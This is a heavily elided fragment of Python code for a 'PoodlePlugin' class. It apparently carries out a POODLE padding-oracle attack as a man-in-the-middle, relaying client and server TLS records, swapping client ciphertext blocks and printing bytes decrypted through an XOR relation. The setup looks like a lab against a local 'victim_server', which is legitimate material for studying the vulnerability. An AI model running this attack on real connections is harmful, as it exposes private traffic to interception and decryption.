...
class PoodlePlugin:
    ...
    def start(self):
        ...
        while True:
            ...
            ctx.server_ctx.load_rsa_keys_from_file('victim_server/privkey.pem')
            #ctx.client_ctx.load_rsa_keys_from_file('victim_server/privkey.pem')
            client_request = None
            try:
                while not stop:
                    ins, outs, errs = select([s1, s2], [], [], None)
                    for s in ins:
                        print("\033[97m>", label[s], "\033[0m")
                        p = s.recv()
                        ...
                        for (record, cipher), plain in zip(cipherdata, plaindata):
                            if len(cipher) > mac_length:
                                if label[s] == 'client':
                                    print("\033[94mProbably Request ({} > {})\033[0m".format(len(cipher), mac_length))
                                    client_request = cipher
                                elif label[s] == 'server':
                                    print("\033[94mProbably Response ({} > {})\033[0m".format(len(cipher), mac_length))
                            print("\033[91mCiphertext\033[0m")
                            print_hexdump(cipher, colored=True, cols=ctx.sec_params.block_size)
                            if DEBUG:
                                print("\033[92mPlaintext\033[0m")
                                print_hexdump(plain, colored=True, cols=ctx.sec_params.block_size)
                            ...
                            if len(cipher) > mac_length:
                                ...
                                if label[s] == 'client':
                                    ...
                                    print("\033[91mCiphertext new\033[0m")
                                    print_hexdump(cipher, colored=True, cols=ctx.sec_params.block_size)
                                    # p.show()
                                elif label[s] == 'server':
                                    ...
                                    print("Decrypted: '{}' (0x{:02x} = 0x{:02x}^0x{:02x}^0x{:02x})".format(
                                        decrypted,
                                        ch,
                                        a,
